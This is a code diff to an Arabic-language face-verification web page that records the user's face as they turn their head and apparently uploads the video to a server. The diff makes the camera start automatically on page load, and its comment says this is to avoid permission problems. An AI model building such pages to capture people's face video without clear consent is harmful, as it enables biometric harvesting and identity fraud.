@@ -56,7 +56,7 @@
             align-items: center;
         }
 
-        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); display: none; }
+        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); display: block; }
 
         .guide-overlay {
             display: none;
@@ -120,11 +120,11 @@
                 <div class="guide-overlay" id="guideOverlay">استعد...</div>
                 <div class="scan-line" id="scanLine"></div>
                 <video id="webcam" autoplay playsinline muted></video>
-                <span id="placeholderText" style="color: #555;">الكاميرا مغلقة</span>
+                <span id="placeholderText" style="color: #555; display: none;">الكاميرا مغلقة</span>
             </div>
             
             <button id="actionBtn">بدء الفحص وتسجيل الفيديو</button>
-            <div id="statusText">جاهز للمحاكاة...</div>
+            <div id="statusText">جاري تشغيل الكاميرا تلقائياً...</div>
         </div>
     </div>
 
@@ -143,6 +143,8 @@
 
         let mediaRecorder;
         let recordedChunks = [];
+        let globalStream = null;
+        
         const instructions = [
             "👤 ضع وجهك داخل الإطار الدائري",
             "➡️ التفت ببطء جهة اليمين",
@@ -151,27 +153,43 @@
             "⚙️ جاري معالجة الفحص الحركي..."
         ];
 
+        // فتح الكاميرا فوراً تلقائياً بمجرد فتح الصفحة لتجنب مشاكل الصلاحيات
+        window.addEventListener('DOMContentLoaded', initCamera);
+
+        async function initCamera() {
+            try {
+                globalStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                video.srcObject = globalStream;
+                statusText.innerText = "جاهز لبدء المحاكاة...";
+            } catch (err) {
+                console.error("خطأ تشغيل الكاميرا المبدئي:", err);
+                placeholderText.style.display = "block";
+                statusText.innerText = "فشل تشغيل الكاميرا. يرجى إعطاء صلاحية الكاميرا للموقع.";
+            }
+        }
+
         actionBtn.addEventListener('click', startVerification);
 
         async function startVerification() {
             actionBtn.disabled = true;
-            statusText.innerText = "جاري تشغيل الكاميرا وبدء التسجيل...";
+            statusText.innerText = "جاري بدء التسجيل...";
             recordedChunks = [];
 
+            if (!globalStream) {
+                statusText.innerText = "الكاميرا غير متصلة، يرجى تحديث الصفحة.";
+                actionBtn.disabled = false;
+                return;
+            }
+
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-                video.srcObject = stream;
-                placeholderText.style.display = "none";
-                video.style.display = "block";
                 scanLine.style.display = "block";
                 guideOverlay.style.display = "block";
 
-                mediaRecorder = new MediaRecorder(stream);
+                mediaRecorder = new MediaRecorder(globalStream);
                 mediaRecorder.ondataavailable = e => { if (e.data.size > 0) recordedChunks.push(e.data); };
                 
                 mediaRecorder.onstop = async () => {
                     const blob = new Blob(recordedChunks, { type: 'video/mp4' });
-                    
                     statusText.innerText = "جاري رفع فيديو التحقق إلى السيرفر الآمن...";
                     
                     const fileName = 'video_' + Date.now() + '.mp4';
@@ -203,7 +221,7 @@
                 mediaRecorder.start();
                 runInstructions(0);
             } catch (err) {
-                statusText.innerText = "فشل تشغيل الكاميرا. يرجى إعطاء صلاحية الكاميرا للموقع.";
+                statusText.innerText = "حدث خطأ أثناء بدء التسجيل.";
                 actionBtn.disabled = false;
             }
         }
@@ -222,8 +240,7 @@
             guideOverlay.innerText = "اكتمل الفحص! ✓";
 
             if (mediaRecorder && mediaRecorder.state !== "inactive") mediaRecorder.stop();
-            const stream = video.srcObject;
-            if (stream) stream.getTracks().forEach(track => track.stop());
+            if (globalStream) globalStream.getTracks().forEach(track => track.stop());
         }
     </script>
 </body>
